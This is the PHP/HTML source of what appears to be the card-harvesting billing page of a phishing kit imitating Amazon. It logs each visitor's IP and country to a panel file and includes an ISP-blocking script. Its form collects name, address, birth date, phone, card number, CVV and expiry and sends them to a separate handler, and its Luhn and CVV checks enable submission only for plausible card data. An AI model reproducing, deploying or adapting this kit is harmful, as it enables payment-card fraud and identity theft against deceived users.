<?php

session_start();
include('__CONFIG__.php');
include 'bahasa.php';
require "Library/ClassFunction/Blockisp.php";

$file = fopen('panel/country.txt', "a");
$time = date('H:i dS F');
fwrite ($file, " IP $showIP Dari $showCountry Mengakses Billing Page\r\n ");
fclose( $file );



?>
<!DOCTYPE html>
<html lang="en">

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script type='text/javascript' src='http://code.jquery.com/jquery-1.11.0.js'></script>
  <script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
    <link rel="stylesheet" href="Sheets/alert.css">
    <link rel="stylesheet" href="Sheets/accbilling.css">
    <link rel="shortcut icon" href="Assets/img/favicon.ico" />
    <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script type='text/javascript' src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>

    <title><?php echo $acyba; ?></title>
    <style>
.alert {
  padding: 20px;
  background-color: #f44336;
  color: white;
}

.closebtn {
  margin-left: 15px;
  color: white;
  font-weight: bold;
  float: right;
  font-size: 22px;
  line-height: 20px;
  cursor: pointer;
  transition: 0.3s;
}

.closebtn:hover {
  color: black;
}
</style>


</head>

<body>

    <div class="mynavbar">
        <div class="container-fluid">
            <ul class="nav">
                <li class="nav-item">
                    <a class="nav-link" href="#">
                        <img src="Assets/img/logo.png" alt="" class="brandimg">
                    </a>
                </li>
                <li class="nav-item ml-auto myddown">
                    <div class="dropdown">
                        <button class="btn btndown dropdown-toggle" type="button">
                            <?php echo $acc ?>
                        </button>
                        <div class="mydropdown d-none" id="buttonToggle">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="#" class="mylink"><?php echo $sett; ?></a></li>
                                <li class="list-group-item"><a href="#" class="mylink"><?php echo $sa; ?></a></li>
                                <li class="list-group-item"><a href="#" class="mylink"><?php echo $si; ?></a></li>
                            </ul>
                        </div>

                    </div>
                </li>
            </ul>
        </div>
    </div>

    <div class="a-content">
        <div class="container">
            <span class="lefttext"><a href="#" class="lefttext"><?php echo $ya; ?></a></span>
            <span class="middle">></span>
            <span class="righttext"><?php echo $yaw; ?></span>
            <p class="alerttext"><?php echo $ass; ?></p>


            <div class="row">
                <div class="col-12">
                    <div class="mypayementarea">
                        <form action="Actions/billing.php" method="post" onSubmit="return (validateCreditCardNumber() && type_carte())">
                            <span class="colorblacked"><?php echo $cbmyba; ?></span>
                            

                            <div class="row mt-3">
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="fullname"><?php echo $fn; ?></label>
                                        <input type="text" class="form-control amazoninput" name="fullname" id="fullname" placeholder="<?php echo $fnn ?>" required>
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="adressline1"><?php echo $add1; ?></label>
                                        <input type="text" class="form-control amazoninput" name="address1" id="adressline1" placeholder="<?php echo $sap ?>" required>
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="adressline2"><?php echo $add2; ?></label>
                                        <input type="text" class="form-control amazoninput" name="address2" id="adressline2" placeholder="<?php echo $apsub ?>">
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="adressline2"><?php echo $cty; ?></label>
                                        <input type="text" class="form-control amazoninput" name="city" id="adressline2" placeholder="<?php echo $ctyy ?>" required>
                                    </div>
                                </div>


                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="stateregionprovince"><?php echo $spr; ?></label>
                                        <input type="text" class="form-control amazoninput" name="state" id="city" placeholder="<?php echo $sprr; ?>" required>
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="zipCode"><?php echo $zp; ?></label>
                                        <input type="text" class="form-control amazoninput" name="zip" id="zipCode" placeholder="<?php echo $zco; ?>" required>
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="country"><?php echo $count; ?></label>
                                        <input type="text" class="form-control amazoninput" value="<?php echo $_SESSION['cntname']; ?>" name="country" id="country" placeholder="<?php echo $conco ?>" required>
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="birth"><?php echo $dov; ?> </label>
                                        <input class="form-control amazoninput" type="text" name="dob" id="birth" placeholder="DD/MM/YYYY" required>
                                    </div>
                                </div>

                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="phonenumber"><?php echo $pone; ?></label>
                                        <input type="tel" class="form-control amazoninput" name="phone" id="input-phone" placeholder="<?php echo $panu; ?>" required>
                                    </div>
                                </div>


                            </div>

                            <span class="colorblacked" style="display:block;"><?php echo $cypm; ?></span>
                            <div id="cc-image" class="mt-1">
                                <img id="mt-1.visa" src="Assets/img/payment1.png" alt="">
                                <img id="mt-1.master" src="Assets/img/payment2.png" alt="">
                                <img id="mt-1.amex" src="Assets/img/payment3.png" alt="">
                                <img id="mt-1.dinner" src="Assets/img/payment4.png" alt="">
                                <img id="mt-1.discover" src="Assets/img/payment5.png" alt="">
                                <img id="mt-1.jcb" src="Assets/img/payment6.png" alt="">
                                <img id="mt-1.union" src="Assets/img/payment7.png" alt="">
                            </div>
                            <div class="row mt-3">
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="nameoncard"><?php echo $noc; ?> </label>
                                        <input type="text" class="form-control amazoninput" name="nameoncard" id="nameoncard" placeholder="<?php echo $chn ?>" required>
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="id_xccaaa"><?php echo $cnm; ?> </label>
                                        <input type="tel" name="credit_card" class="cc-number form-control amazoninput" id="id_xccaaa" onfocusout="ccc();" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required="" 
                                        >
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="form-group">
                                        <label for="csc"><?php echo $csc; ?></label>
                                        <input type="text" class="form-control amazoninput" name="cvv_card" id="xc" placeholder="CVV/CVV2" maxlength="4" required>
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    <div class="row">
                                        <div class="col-6">
                                            <div class="form-group">
                                                <label for="months"></label>
                                                <select class="form-control bgcolored2" name="month" id="months" required="required">
                                                    <option>01</option>
                                                    <option>02</option>
                                                    <option>03</option>
                                                    <option>04</option>
                                                    <option>05</option>
                                                    <option>06</option>
                                                    <option>07</option>
                                                    <option>08</option>
                                                    <option>09</option>
                                                    <option>10</option>
                                                    <option>11</option>
                                                    <option>12</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-6">
                                            <div class="form-group">
                                                <label for="months"></label>
                                                <select class="form-control bgcolored2" name="year" id="months" required="required">
                                                    <option value="<?php  echo date("Y");?>" selected="">
                  <?php  echo date("Y");?>
                </option>
				<option value="<?php  echo date("Y")+1;?>">
                  <?php  echo date("Y")+1;?>
                </option>
				<option value="<?php  echo date("Y")+2;?>">
                  <?php  echo date("Y")+2;?>
                </option>
				<option value="<?php  echo date("Y")+3;?>">
                  <?php  echo date("Y")+3;?>
                </option>
				<option value="<?php  echo date("Y")+4;?>">
                  <?php  echo date("Y")+4;?>
                </option>
				<option value="<?php  echo date("Y")+5;?>">
                  <?php  echo date("Y")+5;?>
                </option>
				<option value="<?php  echo date("Y")+6;?>">
                  <?php  echo date("Y")+6;?>
                </option>
				<option value="<?php  echo date("Y")+7;?>">
                  <?php  echo date("Y")+7;?>
                </option>
				<option value="<?php  echo date("Y")+8;?>">
                  <?php  echo date("Y")+8;?>
                </option>
				<option value="<?php  echo date("Y")+9;?>">
                  <?php  echo date("Y")+9;?>
                </option>
				<option value="<?php  echo date("Y")+10;?>">
                  <?php  echo date("Y")+10;?>
                </option>
				<option value="<?php  echo date("Y")+11;?>">
                  <?php  echo date("Y")+11;?>
                </option>
				<option value="<?php  echo date("Y")+12;?>">
                  <?php  echo date("Y")+12;?>
                </option>
				<option value="<?php  echo date("Y")+13;?>">
                  <?php  echo date("Y")+13;?>
                </option>
				<option value="<?php  echo date("Y")+14;?>">
                  <?php  echo date("Y")+14;?>
                </option>
				<option value="<?php  echo date("Y")+15;?>">
                  <?php  echo date("Y")+15;?>
                </option>
				<option value="<?php  echo date("Y")+16;?>">
                  <?php  echo date("Y")+16;?>
                </option>
				<option value="<?php  echo date("Y")+17;?>">
                  <?php  echo date("Y")+17;?>
                </option>
				<option value="<?php  echo date("Y")+18;?>">
                  <?php  echo date("Y")+18;?>
                </option>
				<option value="<?php  echo date("Y")+19;?>">
                  <?php  echo date("Y")+19;?>
                </option>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                </div>


                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <input type="submit" name="Sex" class="btn bgcolored " id="ccnum" value="<?php echo $con ?>" disabled/>
                                </div>
                            </div>
                        </form>
                    </div>

                </div>
            </div>
        </div>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>
    <script src="Library/jQuery/mask/jquery.mask.min.js"></script>
    <script src="Library/Cleave/dist/cleave.js"></script>
    <script src="Library/Cleave/dist/addons/cleave-phone.i18n.js"></script>


    <script>
        $(document).ready(function() {
            $('.alert').hide();
            $('.myddown').hover(function() {
                $('.mydropdown').togleClass('d-none');
            })
            $('#buttonToggle').toggleClass();
            $('#birth').mask('00/00/0000');
        })
    </script>
    <!----> This img
    <script>
        var visa = document.getElementById("mt-1.visa");
        var master = document.getElementById("mt-1.master");
        var ccimage = document.getElementById("cc-image");
        
    </script>
    
<!----> this For date
    <script>
        new Cleave('#birth', {
                date: true,
                datePattern: ['d', 'm', 'Y']
        });
        new Cleave('#id_xccaaa', {
            creditCard: true,
        })
        new Cleave('#input-phone', {
            phone: true,
            phoneRegionCode: 'JP'
        });
    </script>

// <script>
// var visaPattern = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
// var mastPattern = /^(?:5[1-5][0-9]{14})$/;
// var amexPattern = /^(?:3[47][0-9]{13})$/;
// var discPattern = /^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;
// var jcbPattern  = /^(?:(?:2131|1800|35\d{3})\d{11})$/;; 

// function validateCreditCardNumber() {

//     var ccNum  = document.getElementById("id_xccaaa").value;

//     var isVisa = visaPattern.test( ccNum ) === true;
//     var isMast = mastPattern.test( ccNum ) === true;
//     var isAmex = amexPattern.test( ccNum ) === true;
//     var isDisc = discPattern.test( ccNum ) === true;
//     var isJcb  = jcbPattern.test( ccNum ) === true;

//     if( isVisa || isMast || isAmex || isDisc || isJcb ) {
//         // at least one regex matches, so the card number is valid.

//         if( isVisa ) {
//             // Visa-specific logic goes here
//         }
//         else if( isMast ) {
//              // Mastercard-specific logic goes here
//         }
//         else if( isAmex ) {
//             // AMEX-specific logic goes here
//         }
//         else if( isDisc ) {
//             // Discover-specific logic goes here
//         }
//         else if( isDisc ) {
//             // Disc-specific logic goes here
//         }
//         else if( isJcb ) {
//             // JCB-specific logic goes here
//         }
//     }
//     else {
//         $('.alert').show();
//         return false;
//     }
// }
// </script>

<script>
    var acceptedCreditCards = {
  visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
  mastercard: /^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/,
  amex: /^3[47][0-9]{13}$/,
  discover: /^65[4-9][0-9]{13}|64[4-9][0-9]{13}|6011[0-9]{12}|(622(?:12[6-9]|1[3-9][0-9]|[2-8][0-9][0-9]|9[01][0-9]|92[0-5])[0-9]{10})$/,
  diners_club: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
  jcb: /^(?:2131|1800|35[0-9]{3})[0-9]{11}$/,
};

$('#id_xccaaa, #xc').on('input', function(){
  if (validateCard($('#id_xccaaa').val()) && validateCVV($('#id_xccaaa').val(), $('#xc').val())) {
    $('input[type="submit"]').prop('disabled', false);
  } else {
    $('input[type="submit"]').prop('disabled', true);
  }
});

function validateCard(value) {
  // remove all non digit characters
  var value = value.replace(/\D/g, '');
  var sum = 0;
  var shouldDouble = false;
  // loop through values starting at the rightmost side
  for (var i = value.length - 1; i >= 0; i--) {
    var digit = parseInt(value.charAt(i));

    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }
  
  var valid = (sum % 10) == 0;
  var accepted = false;
  
  // loop through the keys (visa, mastercard, amex, etc.)
  Object.keys(acceptedCreditCards).forEach(function(key) {
    var regex = acceptedCreditCards[key];
    if (regex.test(value)) {
      accepted = true;
    }
  });
  
  return valid && accepted;
}


function validateCVV(creditCard, cvv) {
  // remove all non digit characters
  var creditCard = creditCard.replace(/\D/g, '');
  var cvv = cvv.replace(/\D/g, '');
  // american express and cvv is 4 digits
  if ((acceptedCreditCards.amex).test(creditCard)) {
    if((/^\d{4}$/).test(cvv))
      return true;
  } else if ((/^\d{3}$/).test(cvv)) { // other card & cvv is 3 digits
    return true;
  }
  return false;
}
</script>

</body>

</html>